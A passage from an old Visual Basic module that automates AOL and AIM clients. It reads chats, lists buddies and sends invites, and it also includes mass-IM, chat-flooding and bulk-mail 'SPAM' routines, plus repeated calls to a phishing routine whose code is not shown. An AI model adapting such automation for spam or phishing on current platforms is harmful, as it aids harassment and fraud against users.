    stText$ = Filter$
    Next intLoop%


Win_Filter$ = stText$
End Function








Sub AIM_WaitforERROR()
'ouwop
Do
DoEvents
OKw = FindWindow("#32770", "AOL Instant Messenger (SM)")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until OKw <> 0
   
    okb = FindChildByTitle(OKw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
AIM_CloseChat

End Sub



Function AIM_GetchatText()
box& = FindWindowEx(findchatroomAIM, 0&, "RICHCNTL", vbNullString)
AIM_GetchatText = gettext(box&)
End Function
Function Win_TrimText(strtext As String) As String
'This converts any string to no spaces and
'No Caps.
stringM$ = ""

    If InStr(strtext, " ") = 0 Then
    stringM$ = strtext
    Else
    For intLoop = 1 To Len(strtext)
    stringNew$ = Mid(strtext, intLoop, 1)
    If stringNew$ = " " Then Else: _
    stringM$ = stringM$ + stringNew$
    Next intLoop
    End If
        
    stringN$ = LCase(stringM$)
    Win_TrimText = stringN$
    
End Function

Function AIM_FindChatter(strSName As String) As Boolean
'by psyche
   DoEvents:
    On Error Resume Next
    If AIM_FindChatRoom <> 0 Then
    Do Until BuddyTree& <> 0
    BuddyTree& = FindWindowEx(AIM_FindChatRoom, 0, "_Oscar_Tree", vbNullString)
    Loop
    End If
    
    Call SendMessageByString(BuddyTree&, LB_SETCURSEL, intLoop%, 0)
    Count& = SendMessage(BuddyTree&, LB_GETCOUNT, 0, 0)

    For intLoop% = 0 To Count& - 1
    lLength& = SendMessage(BuddyTree&, LB_GETTEXTLEN, intLoop%, 0)
    lEmptyT$ = String(lLength&, " ")
    
    lFullTe$ = SendMessageByString(BuddyTree&, LB_GETTEXT, intLoop%, lEmptyT$)
    lTab& = InStr(lEmptyT$, Chr(9)) 'Find Tab.
    sName$ = Right$(lEmptyT$, Len(lEmptyT$) - lTab&)

    lTab& = InStr(sName$, Chr(9))
    sText$ = Right$(sName$, Len(sName$) - lTab&)
    sName2$ = sText$
    
    If Win_TrimText(sName$) = Win_TrimText(strSName$) Then GoTo End1
Next intLoop%

AIM_FindChatter = False
Exit Function

End1:
AIM_FindChatter = True
End Function


Function AIM_CountEnters(strtext As String) As Integer
    Dim intLoop As Integer
    For intLoop% = 1 To Len(strtext$)
    If InStr(intLoop%, strtext$, Chr(13)) > 0 Then
    lEnters% = lEnters% + 1
    intLoop% = InStr(intLoop%, strtext$, Chr(13)) + 1
    Else:
    GoTo End1
    End If
    Next intLoop%

End1:
AIM_CountEnters% = lEnters%
End Function

Function AIM_CountBuddy() As Integer
    DoEvents:
    On Error Resume Next
    lBudList& = FindWindow("_Oscar_BuddyListWin", vbNullString)
    lTabGrou& = FindWindowEx(lBudList&, 0, "_Oscar_TabGroup", vbNullString)
    BuddyTree& = FindWindowEx(lTabGrou&, 0, "_Oscar_Tree", vbNullString)


    Count& = SendMessage(BuddyTree&, LB_GETCOUNT, 0, 0)
    For intLoop% = 0 To Count&
    Call SendMessageByString(BuddyTree&, LB_SETCURSEL, intLoop%, 0)
    lLength& = SendMessage(BuddyTree&, LB_GETTEXTLEN, intLoop%, 0)
    lEmptyT$ = String(lLength&, " ")
    
    lFullTe$ = SendMessageByString(BuddyTree&, LB_GETTEXT, intLoop%, lEmptyT$)
    lTab& = InStr(lEmptyT$, Chr(9)) 'Find Tab.
    sName$ = Right$(lEmptyT$, Len(lEmptyT$) - lTab&)

    lTab& = InStr(sName$, Chr(9))
    sText$ = Right$(sName$, Len(sName$) - lTab&)
    If InStr(sName$, "/") > 0 Then GoTo nLoop
    sName2$ = sText$
    
    AIM_CountBuddy% = AIM_CountBuddy% + 1
nLoop:
Next intLoop%
If AIM_CountBuddy% > 0 Then _
AIM_CountBuddy% = AIM_CountBuddy% - 1
End Function
Public Sub AIM_CloseErrors(lLimit As Long)
    
    If FindWindow("#32770", vbNullString) > 0 Then
    Do Until lAimError& = 0 Or lLim& >= lLimit
   
    lAimError& = FindWindow("#32770", vbNullString)
    Call Win_Close(lAimError&)
    Loop
    End If
End Sub

Public Sub AIM_AddBuddy(objBox As Object, blnAddYourself As Boolean)
    DoEvents:
    On Error Resume Next
    lBudList& = FindWindow("_Oscar_BuddyListWin", vbNullString)
    lTabGrou& = FindWindowEx(lBudList&, 0, "_Oscar_TabGroup", vbNullString)
    BuddyTree& = FindWindowEx(lTabGrou&, 0, "_Oscar_Tree", vbNullString)
    Count& = SendMessage(BuddyTree&, LB_GETCOUNT, 0, 0)
    For intLoop% = 0 To Count&
    Call SendMessageByString(BuddyTree&, LB_SETCURSEL, intLoop%, 0)
    lLength& = SendMessage(BuddyTree&, LB_GETTEXTLEN, intLoop%, 0)
    lEmptyT$ = String(lLength&, " ")
    lFullTe$ = SendMessageByString(BuddyTree&, LB_GETTEXT, intLoop%, lEmptyT$)
    lTab& = InStr(lEmptyT$, Chr(9))
    sName$ = Right$(lEmptyT$, Len(lEmptyT$) - lTab&)
    lTab& = InStr(sName$, Chr(9))
    sText$ = Right$(sName$, Len(sName$) - lTab&)
    If InStr(sName$, "/") > 0 Then GoTo nLoop
    sName2$ = sText$
    If blnAddYourself = False And sName2$ = UserName$ Then Else: _
    objBox.AddItem (sName2$)
nLoop:
Next intLoop%
End Sub
Public Sub AIM_SayBuddies()
    DoEvents:
    On Error Resume Next
    lBudList& = FindWindow("_Oscar_BuddyListWin", vbNullString)
    lTabGrou& = FindWindowEx(lBudList&, 0, "_Oscar_TabGroup", vbNullString)
    BuddyTree& = FindWindowEx(lTabGrou&, 0, "_Oscar_Tree", vbNullString)


    Count& = SendMessage(BuddyTree&, LB_GETCOUNT, 0, 0)
    For intLoop% = 0 To Count&
    lLength& = SendMessage(BuddyTree&, LB_GETTEXTLEN, intLoop%, 0)
    lEmptyT$ = String(lLength&, " ")
    
    lFullTe$ = SendMessageByString(BuddyTree&, LB_GETTEXT, intLoop%, lEmptyT$)
    lTab& = InStr(lEmptyT$, Chr(9)) 'Find Tab.
    sName$ = Right$(lEmptyT$, Len(lEmptyT$) - lTab&)

    lTab& = InStr(sName$, Chr(9))
    sText$ = Right$(sName$, Len(sName$) - lTab&)
    If InStr(sName$, "/") > 0 Then GoTo nLoop
    sName2$ = sText$
    
    If sName2$ = AIM_UserSN Then Else: _
    Call AIM_SendChat("My buddy, " + sName2$ + " iz on!")
    
nLoop:
Next intLoop%
End Sub


Function AIM_UserSN()
Dim aim As Long
On Error Resume Next
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
name$ = getcaption(aim&)
If InStr(name$, "Buddy List") <> 0 Then
Text% = GetWindowTextLength(aim&)
Text% = (Text%) - 21
sn$ = Left$(name$, InStr(name$, "" + name$ + "") + Text%)
AIM_UserSN = sn$
Else
AIM_UserSN = "(Unknown)"
End If
End Function

Sub AIM_MassIM(chk As CheckBox, lbl5 As Label, lbl As Label, list As ListBox, message As String, list2 As ListBox, text4 As TextBox)
'ouwop
If list.listcount = 0 Then
Do: DoEvents: Loop
End If
list.Enabled = False
i = list.listcount - 1
list.ListIndex = 0
'chk2.Enabled = False
dat$ = list.listcount
For X = 0 To i
If lbl5.caption = "m" Then GoTo ert
'If chk2.Value = 1 Then tmr2.Enabled = True Else tmr2.Enabled = False
list.ListIndex = "0"
FFf$ = list.listcount
lbl.caption = "Statuz: " + AIM_UserSN + " <><ing " + list
If chk.Value = 1 Then sendchat ("<B>#</B>[" + FFf$ + "/" + dat$ + "] <B>Statuz: " + UserSN + " <><ing " + list)
TimeOut (0.1)
If lbl5.caption = "m" Then GoTo ert
Call AIM_SendIM(list.Text, message)
TimeOut (0.3)
AIM_CloseIM
Call AIM_PhisH(chk, text4, list2)
list.RemoveItem list.ListIndex
'If chk2.Value = 1 Then tmr2.Enabled = True Else tmr2.Enabled = False
Call AIM_PhisH(chk, text4, list2)
TimeOut (3.5)
Call AIM_PhisH(chk, text4, list2)
TimeOut (0.5)
Next X
ert:
'If chk2.Value = 1 Then tmr2.Enabled = True Else tmr2.Enabled = False
list.Enabled = True
Call AIM_PhisH(chk, text4, list2)
lbl.caption = "Statuz: " + AIM_UserSN + " not <>< ing"
'chk2.Enabled = True
'tmr2.Enabled = False
'If chk2.Value = 1 Then chk2.Value = 0 Else chk2.Value = 1
End Sub

Function gettext(child)
gettrim = SendMessageByNum(child, 14, 0&, 0&)
trimspace$ = Space$(gettrim)
getString = SendMessageByString(child, 13, gettrim + 1, trimspace$)
gettext = trimspace$
End Function
Function AIM_FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
AIM_FindChildByClass = 0

bone:
room% = firs%
AIM_FindChildByClass = room%

End Function



Function AIM_FindChildByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(getcaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(getcaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(getcaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
AIM_FindChildByTitle = 0

bone:
room% = firs%
AIM_FindChildByTitle = room%
End Function
Sub AIM_ClickIcon(icon%)
Click% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Click% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub


Sub AIM_HideAd()
Dim part1 As Long, part2 As Long, HideIt As Long
part1& = FindWindow("_Oscar_BuddyListWin", vbNullString)
part2& = FindWindowEx(part1&, 0&, "WndAte32Class", vbNullString)
HideIt& = ShowWindow(part2&, SW_HIDE)
End Sub
Function AIM_Scroller(message$)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
TimeOut (0.25)
AIM_SendChat message$
End Function

Function AIM_GetCaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))
AIM_GetCaption = hwndTitle$
End Function

Function AIM_FindChatRoom()
Dim chat As Long
chat& = FindWindow("AIM_ChatWnd", vbNullString)
AIM_FindChatRoom = chat&
End Function
Function AIM_IsOnline()
Dim aim As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
AIM_IsOnline = aim&
End Function


Function AIM_GetChatName()
Dim chat As Long
On Error Resume Next
chat& = FindWindow("AIM_ChatWnd", vbNullString)
RoomName$ = getcaption(chat&)
room$ = Mid(RoomName$, InStr(RoomName$, ":") + 2)
AIM_GetChatName = room$
End Function

Function AIM_ClearChat()
Dim chat As Long, box As Long
chat& = FindWindow("AIM_ChatWnd", vbNullString)
box& = FindWindowEx(chat&, 0&, "WndAte32Class", vbNullString)
Call SendMessageByString(box&, WM_SETTEXT, 0, "")

End Function

Function AIM_SendLink(Link$, message$)
AIM_SendChat "<a href=""" + Link$ + """>" + message$ + ""
End Function


Function AIM_SendInvite(Who$, message$, chat$)
Dim aim As Long, Group As Long, Button As Long, Button2 As Long, Invite As Long, edit1 As Long, edit2 As Long, edit3 As Long, send As Long, send2 As Long, send3 As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Group& = FindWindowEx(aim&, 0&, "_Oscar_TabGroup", vbNullString)
Button& = FindWindowEx(Group&, 0&, "_Oscar_IconBtn", vbNullString)
Button2& = FindWindowEx(Group&, Button&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (Button2&)
Invite& = FindWindow("AIM_ChatInviteSendWnd", vbNullString)
edit1& = FindWindowEx(Invite&, 0&, "Edit", vbNullString)
Call SendMessageByString(edit1&, WM_SETTEXT, 0, Who$)
edit2& = FindWindowEx(Invite&, edit1&, "Edit", vbNullString)
Call SendMessageByString(edit2&, WM_SETTEXT, 0, message$)
edit3& = FindWindowEx(Invite&, edit2&, "Edit", vbNullString)
Call SendMessageByString(edit3&, WM_SETTEXT, 0, chat$)
send& = FindWindowEx(Invite&, 0&, "_Oscar_IconBtn", vbNullString)
send2& = FindWindowEx(Invite&, send&, "_Oscar_IconBtn", vbNullString)
send3& = FindWindowEx(Invite&, send2&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (send3&)
End Function
Public Sub Win_Close(ByVal lWinHandle As Long)
'This will kill a window
    Call PostMessage(lWinHandle, WM_CLOSE, 0&, 0&)
End Sub

Function KillWindow(window%)
KillWindow = SendMessageByNum(window%, WM_CLOSE, 0, 0)
End Function

Function AIM_SignOff()
Call RunMenuByString(FindWindow("_Oscar_BuddyListWin", vbNullString), "Sign O&ff")
End Function


Function AIM_Exit()
Call RunMenuByString(FindWindow("_Oscar_BuddyListWin", vbNullString), "E&xit")
End Function
Public Sub AIM_ChatClear()
    lChaPar& = FindWindowEx(FindChat&, 0, "WndAte32Class", vbNullString)
    lChPar2& = FindWindowEx(lChaPar&, 0, "Ate32Class", vbNullString)
    Call Win_SetTxt(lChPar2&, " ")
    End Sub
Public Sub AIM_ChatFilter()
    lChText& = FindWindowEx(FindChat&, 0, "WndAte32Class", vbNullString)
    String1$ = Win_GetTxt(lChText&)
    String1$ = AIM_FilterHtml(4000)
    String1$ = Win_Replace(String1$, Chr(13), String(160, " "))
    lChaPar& = FindWindowEx(FindChat&, 0, "WndAte32Class", vbNullString)
    lChPar2& = FindWindowEx(lChaPar&, 0, "Ate32Class", vbNullString)
    Call AOL4_SetText(lChPar2&, String1$)
End Sub
Public Sub AIM_ChatFilter2()
    lChText& = FindWindowEx(FindChat&, 0, "WndAte32Class", vbNullString)
    String1$ = Win_GetTxt(lChText&)
    If Len(String1$) >= 4000 Then
    lCut$ = Right(String1$, 4000)
    lBre& = InStr(1, LCase(lCut$), "<br>")
    String1$ = Right(lCut$, Len(lCut$) - (lBre& + 3))
    End If
    String1$ = Win_Replace(LCase(String1$), "<br>", String(120, " "))
    lChaPar& = FindWindowEx(FindChat&, 0, "WndAte32Class", vbNullString)
    lChPar2& = FindWindowEx(lChaPar&, 0, "Ate32Class", vbNullString)
    Call AOL4_SetText(lChPar2&, LCase(String1$))
End Sub
Public Sub AIM_ChatIgnore(iIndex As Integer)
    DoEvents:
    On Error Resume Next
    If AIM_FindChatRoom <> 0 Then
    Do Until lngAllPeop& <> 0
    lngAllPeop& = FindWindowEx(AIM_FindChatRoom, 0, "_Oscar_Tree", vbNullString)
    Loop
    End If
    lngSetCurs& = SendMessageByNum(lngAllPeop&, LB_SETCURSEL, iIndex%, 0)
    lLbHan& = FindWindowEx(AIM_FindChatRoom, 0, "_Oscar_IconBtn", vbNullString)
    lLbHan2& = FindWindowEx(AIM_FindChatRoom, lLbHan&, "_Oscar_IconBtn", vbNullString)
    Call Win_Click(lLbHan2&)
    End Sub
Public Sub Win_Click(ByVal lWinHandle As Long)
'This clicks any command button
    DoEvents
    Call SendMessage(lWinHandle, WM_LBUTTONDOWN, 0, vbNullString)
    Call SendMessage(lWinHandle, WM_LBUTTONUP, 0, vbNullString)
    DoEvents
End Sub
Public Sub AIM_ChatIgnore2(strSName As String)
    DoEvents:
    On Error Resume Next
    If AIM_FindChatRoom <> 0 Then
    Do Until BuddyTree& <> 0
    BuddyTree& = FindWindowEx(AIM_FindChatRoom, 0, "_Oscar_Tree", vbNullString)
    Loop
    End If
    Call SendMessageByString(BuddyTree&, LB_SETCURSEL, intLoop%, 0)
    Count& = SendMessage(BuddyTree&, LB_GETCOUNT, 0, 0)
    For intLoop% = 0 To Count& - 1
    lLength& = SendMessage(BuddyTree&, LB_GETTEXTLEN, intLoop%, 0)
    lEmptyT$ = String(lLength&, " ")
        lFullTe$ = SendMessageByString(BuddyTree&, LB_GETTEXT, intLoop%, lEmptyT$)
    lTab& = InStr(lEmptyT$, Chr(9))
    sName$ = Right$(lEmptyT$, Len(lEmptyT$) - lTab&)
    lTab& = InStr(sName$, Chr(9))
    sText$ = Right$(sName$, Len(sName$) - lTab&)
    sName2$ = sText$
        If LCase(sName2$) = LCase(strSName$) Then _
    Call AIM_ChatIgnore(intLoop%)
Next intLoop%
End Sub

Public Sub AIM_ChatInvite2(stToWho As String)
    DoEvents:
    On Error Resume Next
    If AIM_FindChatRoom = 0 Then
    strInp$ = InputBox("Please go to a room first: ", "Error", "")
    If strInp$ = 0 Then strInp$ = "Error"
    Call AIM_ChatInvite1(stToWho$, "", strInp$)
    Else
    stRoom$ = chatName
    Call AIM_CloseChat
    Call AIM_ChatInvite1(stToWho$, "", stRoom$)
    End If
End Sub
Public Sub AIM_ChatInvite1(stToWho As String, stMessage As String, stChatroom As String)
'by Frubal
    DoEvents:
    On Error Resume Next
    Call AIM_OpenInvite
    If Len(stToWho) = 0 Then stToWho = "none"
    lngChatBef& = FindWindow("AIM_ChatInviteSendWnd", "Buddy Chat Invitation ")
    lngChatSn& = FindWindowEx(lngChatBef&, 0, "Edit", vbNullString)
       If Len(stMessage) > 0 Then
    lngChatMsg& = FindWindow("AIM_ChatInviteSendWnd", "Buddy Chat Invitation ")
    lngChtMsg2& = FindWindowEx(lngChatMsg&, 0, "Edit", vbNullString)
    lngChtMsg3& = FindWindowEx(lngChatMsg&, lngChtMsg2&, "Edit", vbNullString)
    Call Win_SetTxt(lngChtMsg3&, stMessage$)
    End If
    If Len(stChatroom) > 1 Then
    lngTxtChat& = FindWindow("AIM_ChatInviteSendWnd", "Buddy Chat Invitation ")
    lChtName1& = FindWindowEx(lngTxtChat&, 0, "Edit", vbNullString)
    lChtName2& = FindWindowEx(lngTxtChat&, lChtName1&, "Edit", vbNullString)
    lChatname& = FindWindowEx(lngTxtChat&, lChtName2&, "Edit", vbNullString)
    Call Win_SetTxt(lChatname&, stChatroom$)
    End If
    lParWin& = FindWindow("AIM_ChatInviteSendWnd", "Buddy Chat Invitation ")
    lHand1& = FindWindowEx(lParWin&, 0, "_Oscar_IconBtn", vbNullString)
    lHand2& = FindWindowEx(lParWin&, lHand1&, "_Oscar_IconBtn", vbNullString)
    lSend1& = FindWindowEx(lParWin&, lHand2&, "_Oscar_IconBtn", vbNullString)
    Call Win_Click(lSend1&)
End Sub
Public Sub Win_SetTxt(ByVal lWinHandle As Long, ByVal stText As String)
'This writes text to any object
    If Len(stText) > 0 Then
    Call SendMessageByString(lWinHandle, WM_SETTEXT, 0, stText)
    End If
End Sub

Function AIM_ChatLastLine() As String
    String1$ = AIM_FilterHtml(400)
    If InStr(1, String1$, ":") = 0 Then _
    String1$ = AIM_FilterHtml(700)
    If InStr(1, String1$, ":") = 0 Then _
    String1$ = AIM_FilterHtml(900)
    If InStr(1, String1$, ":") = 0 Then _
    String1$ = AIM_FilterHtml(1200)
    AIM_ChatLastLine$ = Right(String1$, Len(String1$) - AIM_LastEnter(String1$))
End Function

Public Sub AIM_OpenInvite()

    lInvPar& = FindWindowEx(FindMain&, 0, "_Oscar_TabGroup", vbNullString)
    lInvHan& = FindWindowEx(lInvPar&, 0, "_Oscar_IconBtn", vbNullString)
    lInvite& = FindWindowEx(lInvPar&, lInvHan&, "_Oscar_IconBtn", vbNullString)
    Call Win_Click(lInvite&)
    
End Sub

Function AIM_ChatLastName() As String
    On Error Resume Next
    stringChat$ = AIM_ChatLastLine
    If InStr(1, stringChat$, ":") = 0 Then
    AIM_ChatLastName = "None"
    End If
        lColon& = InStr(1, stringChat$, ":")
    AIM_ChatLastName$ = Left(stringChat$, lColon& - 1)
End Function

Function AIM_ChatLetter(stLetter As String) As Boolean
    On Error Resume Next
    String1$ = Left(ChatLastLine$, 1)
    If LCase(stLetter$) = LCase(String1$) Then
    AIM_ChatLetter = True
    Else
    AIM_ChatLetter = False
    End If
End Function
Function AIM_CountTags(strtext As String) As Integer
Dim lLeft As Integer, lRight As Integer, intLoop As Integer
For intLoop% = 1 To Len(strtext$)
    
     If InStr(intLoop%, strtext$, "<") > 0 Then
    lLeft% = lLeft% + 1
    Else:
    GoTo End1
    End If
     If InStr(intLoop%, strtext$, ">") > 0 Then
    intLoop% = InStr(intLoop%, strtext$, ">") '+ 1
    lRight% = lRight% + 1
    Else: GoTo End1
    End If
    Next intLoop%

End1: If lLeft% <> lRight% Then
AIM_CountTags% = 0
Else: AIM_CountTags% = lRight%
End If
End Function
Function AIM_ChatLetters(stLetters As String) As Boolean
    On Error Resume Next
    String1$ = Left(AIM_ChatLastLine$, Len(stLetters$))
    If LCase(stLetters$) = LCase(String1$) Then
    AIM_ChatLetters = True
    Else
    AIM_ChatLetters = False
    End If
End Function

Function AIM_ChatText(Amount As Integer) As String
        If Amount% = 0 Then Exit Function
    FindChat1& = FindWindow("AIM_ChatWnd", vbNullString)
    lChText& = FindWindowEx(FindChat1&, 0, "WndAte32Class", vbNullString)
    String1$ = Win_GetTxt(lChText&)
    
    If Len(String1$) = 0 Then Exit Function
    If Len(String1$) > Amount% Then
    String2$ = Right(String1$, Amount%)
    lLeft& = InStr(1, String2$, "<")
    String1$ = Right(String2$, Len(String2$) - lLeft& + 1)
    End If

    AIM_ChatText$ = String1$

End Function


Function AIM_ChatLine(iLine As Integer) As String
    String1$ = AIM_FilterHtml(1000)
    iTest% = CountLines(String1$) + 1
    iLine% = iTest% - iLine%
    AIM_ChatLine$ = Win_GetLine(String1$, iLine%)

End Function

Function Win_GetLine(stText As String, iLine As Integer) As String
'This will get one line of a textbox.
'You can use this for every line except the first!

    On Error Resume Next
    If InStr(1, stText, Chr(13)) = 0 Then
    If iLine = 1 Then
    Win_GetLine$ = stText$
    Exit Function
    End If 'iLine
    End If 'InStr
    
    iStop% = 0
    For intLoop3% = 1 To Len(stText$) Step 1
    stLine1$ = Mid(stText$, intLoop3%, 1)
    
    If stLine1$ = Chr(13) Then
    iStop% = iStop% + 1
        If iStop% >= iLine% Then
            Win_GetLine$ = stLine2$
            Exit Function
        End If 'iStop
        stLine1$ = ""
        stLine2$ = ""
        End If
    stLine2$ = stLine2$ + stLine1$
    Next intLoop3%
    

    Win_GetLine$ = stLine2$
End Function

Function AIM_ChatLineName(iLine As Integer) As String
String1$ = AIM_ChatLine(sLine%)
String1$ = AIM_ChatStringName(String1$)
End Function


Function AIM_FilterHtml(Amount%) As String
Dim intLoop As Integer, stringChat As String
   
    stringChat$ = AIM_ChatText(Amount%)
    stringChat$ = Win_Replace(LCase(stringChat$), "<br>", Chr(13))
    For intLoop% = 1 To AIM_CountTags(stringChat$)

    lLeft2& = InStr(1, stringChat$, "<")
    lRight2& = InStr(1, stringChat$, ">")

    sLeft$ = Left(stringChat$, lLeft2& - 1)
    sFull& = lRight2& - lLeft2& + 1
    sRight$ = Right(stringChat$, Len(stringChat$) - (Len(sLeft$) + sFull&))
    stringChat$ = sLeft$ + sRight$
    Next intLoop%
    
End2:
AIM_FilterHtml$ = stringChat$
End Function
Function Remove_HTML(Text) As String
'wop daddie macz
Dim intLoop As Integer, stringChat As String
    stringChat$ = (Text)
On Error Resume Next
stringChat$ = Win_Replace((stringChat$), "<br>", Chr(13))
    For intLoop% = 1 To AIM_CountTags(stringChat$)
    lLeft2& = InStr(1, stringChat$, "<")
    lRight2& = InStr(1, stringChat$, ">")
    sLeft$ = Left(stringChat$, lLeft2& - 1)
    sFull& = lRight2& - lLeft2& + 1
    sRight$ = Right(stringChat$, Len(stringChat$) - (Len(sLeft$) + sFull&))
    stringChat$ = sLeft$ + sRight$
    Next intLoop%
End2:
Remove_HTML = stringChat$
End Function

Function AIM_ChatLineText(iLine As Integer) As String
    String1$ = AIM_ChatLine(iLine%)
    String1$ = AIM_ChatStringText(String1$)
    AIM_ChatLineText$ = String1$
End Function


Function AIM_ChatStringName(stLine As String) As String
    If InStr(1, stLine$, ":") = 0 Then
    AIM_ChatStringName$ = "None"
    End If
    lColon& = InStr(1, stLine$, ": ")
    AIM_ChatStringName$ = Right(stLine$, Len(stLine$) - lColon& - 1)
End Function
Function AIM_LastEnter(strtext As String) As Integer
    Dim intLoop As Integer
    For intLoop% = 1 To Len(strtext$)
    lEnter& = InStr(intLoop%, strtext$, Chr(13))
    If lEnter& > 0 Then
    lEnters% = lEnter&
    intLoop% = lEnter& + 1
    Else:
    
    GoTo End1
    End If
    
Next intLoop%
End1:
AIM_LastEnter% = lEnters%
End Function



Function AIM_ChatStringText(stLine As String) As String
    On Error Resume Next
    If InStr(1, stLine$, ":") = 0 Then
    AIM_ChatStringText$ = "None"
    End If
    
    lColon& = InStr(1, stLine$, ": ")
    AIM_ChatStringText$ = Right(stLine$, Len(stLine$) - lColon& - 1)
End Function

Function AIM_ChatterCount() As Integer
    If AIM_FindChatRoom <> 0 Then
    Do Until BuddyTree& <> 0
    BuddyTree& = FindWindowEx(AIM_FindChatRoom, 0, "_Oscar_Tree", vbNullString)
    Loop
    End If
        AIM_ChatterCount% = SendMessage(BuddyTree&, LB_GETCOUNT, 0, 0)
End Function
Public Sub AIM_CloseChat()
    DoEvents:
    lChat& = AIM_FindChatRoom
    If lChat& > 0 Then
    Call Win_Close(lChat&)
    End If
End Sub

Sub SendMail_attacheD(filer$, Person$, subject$, message$)
If AOL_VerzioN = 5 Then MsgBox "Cant Uze thiz on AOL5.0: Recommended, AOL4.0", vbCritical, "Err0r!": Exit Sub

''da wop daddy mac coding baybuh
    Dim AOL As Long, MDI As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, OpenSend As Long, doit As Long
    Dim Rich As Long, EditTo As Long, EditCC As Long
    Dim EditSubject As Long, SendButton As Long
    Dim Combo As Long, fCombo As Long, ErrorWindow As Long
    Dim Button1 As Long, Button2 As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    DoEvents

    Do
        DoEvents
        OpenSend& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
       If AOL_VerzioN = 4 Then
       For doit& = 1 To 13
       SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
       Next doit&
       ElseIf AOL_VerzioN = 5 Then
       For doit& = 1 To 14
       SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
       Next doit&
       End If
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, Person$)
    DoEvents
    Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, subject$)
    DoEvents
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, message$)
    DoEvents
    If filer$ = "" Then GoTo nex Else Call Attach(filer$)
nex:
DoEvents
pause 0.4
Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
End Sub

Sub SendMail_SPAM(filer$, Personz As ListBox, deAd As ListBox, subject$, message$, timer2 As Timer)
If AOL_VerzioN = 5 Then MsgBox "Cant Uze thiz on AOL5.0: Recommended, AOL4.0", vbCritical, "Err0r!": Exit Sub
   
   'wop
    Dim AOL As Long, MDI As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, OpenSend As Long, doit As Long
    Dim Rich As Long, EditTo As Long, EditCC As Long
    Dim EditSubject As Long, SendButton As Long
    Dim Combo As Long, fCombo As Long, ErrorWindow As Long
    Dim Button1 As Long, Button2 As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
